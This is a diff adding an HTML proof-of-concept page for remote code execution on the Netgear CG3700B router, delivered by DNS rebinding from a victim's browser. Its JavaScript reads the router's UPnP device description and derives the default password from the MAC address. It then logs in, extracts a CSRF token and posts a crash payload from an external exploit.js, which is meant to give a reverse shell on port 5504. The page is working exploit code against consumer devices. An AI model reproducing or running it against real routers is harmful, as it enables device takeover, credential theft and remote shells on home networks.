@@ -1,0 +1,118 @@
+<html>
+  <head>
+    <script src="exploit.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
+
+    <script>
+
+        worked = false;
+        // define a new console
+var console=(function(oldCons){
+    return {
+        log: function(text){
+            oldCons.log(text);
+            document.getElementById('log').innerHTML += "[-] " + text + "<br/>"
+        },
+        info: function (text) {
+            oldCons.info(text);
+            document.getElementById('log').innerHTML += "[+] " + text + "<br/>"
+        },
+        warn: function (text) {
+            oldCons.warn(text);
+            document.getElementById('log').innerHTML += "[#] " + text + "<br/>"
+        },
+        error: function (text) {
+            oldCons.error(text);
+            document.getElementById('log').innerHTML += "[!] " + text + "<br/>"
+        }
+    };
+}(window.console));
+
+//Then redefine the old console
+window.console = console;
+
+      function reqListener () {
+        if (this.responseText.indexOf("404") < 0) {
+            console.log("DNS rebinding succeeded.");
+            console.log("Leaking information from UPnP service");
+            var udn = get_udn_from_root_device(this.responseText);
+            console.log("UDN: " + udn);
+            var psk = get_psk_from_udn(udn);
+            console.log("Derived PSK: "+ psk);
+            var username = "voo";
+            var url = "http://" + username + ":" + psk + "@" + document.domain + "/controle.htm";
+            console.log("Loading CSRF token from " + url);
+            var token = get_csrf_token(url);
+            if(token != 0) {
+                console.log("Got CSRF token: " + token);
+                console.log("Triggering crash...");
+                var crash_url = "http://" + username + ":" + psk + "@" + document.domain + "/goform/controle?id=" + token;
+                var payload = build_payload();
+                var crash_request = new XMLHttpRequest();
+                crash_request.open("POST", crash_url, true);
+                crash_request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                crash_request.send("text_keyword="+payload+"&text_block=&text_allow=&Action_Add=Add&Action_Del=0&Action_Function=1");
+                console.log("You should have a reverse shell call back on port 5504 now.");
+                worked = true;
+            }
+            else {
+                console.error("An error occured when loading CSRF token.");
+            }
+        }
+      };
+
+      function get_csrf_token(url){
+        var csrf_token_request = new XMLHttpRequest();
+        csrf_token_request.open("GET", url, false);
+        csrf_token_request.send();
+        if (csrf_token_request.status === 200) {
+          var matches = csrf_token_request.responseText.match(/\/goform\/controle\?id=([0-9]+)/);
+          if (matches.length > 0)
+            return matches[1];
+        }
+        return 0;
+      }
+
+      function loadUPNP() {
+        if(!worked) {
+            var oReq = new XMLHttpRequest();
+            oReq.addEventListener("load", reqListener);
+            oReq.open("GET", "http://" + document.domain + "/RootDevice.xml");
+            oReq.send();
+        }
+      }
+
+      function get_udn_from_root_device(root_device) {
+        var parser = new DOMParser();
+        var xmlDoc = parser.parseFromString(root_device,"text/xml");
+        return xmlDoc.getElementsByTagName("UDN")[0].childNodes[0].nodeValue;
+      };
+
+      function get_psk_from_udn(udn){
+        console.log("Extracting MAC address from UDN");
+        var mac_from_udn = udn.split("-")[3];
+        var mac_int = parseInt("0x" + mac_from_udn, 16);
+        var actual_mac = mac_int - 1;
+        var mac = "0x" + actual_mac.toString(16).toUpperCase();
+        var hash = CryptoJS.MD5(mac).toString();
+        console.log("Deriving PSK from MAC (" + mac + ")");
+        var i;
+        var psk = "";
+        for(i = 10; i < 26; i+= 2){
+          psk += String.fromCharCode((parseInt(hash.slice(i, i+2), 16) % 0x1a) * 0x1000000 + 0x41000000 >> 0x18);
+        }
+        return psk;
+      }
+
+    window.addEventListener("DOMContentLoaded", (event) => {
+        console.log("Launched DNS rebinding attack. Waiting for browser cache flush.");
+        setInterval(function(){ loadUPNP(); }, 5000);
+    });
+    </script>
+  </head>
+<body>
+    <center><h1>Netgear CG3700B RCE PoC</h1></center>
+    <pre id="log" style="width:50%;margin:auto;background-color:aliceblue;"></pre>
+</body>
+</html>
